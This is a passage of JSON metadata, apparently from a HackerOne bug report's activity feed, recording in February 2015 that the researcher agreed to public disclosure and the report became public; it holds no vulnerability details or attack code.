domain"},"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":341281,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-02-26T21:50:45.304Z","updated_at":"2015-02-26T21:50:45.304Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":341282,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-02-26T21:50:46.125Z","updated_at":"2015-02-26T21:50:46.125Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}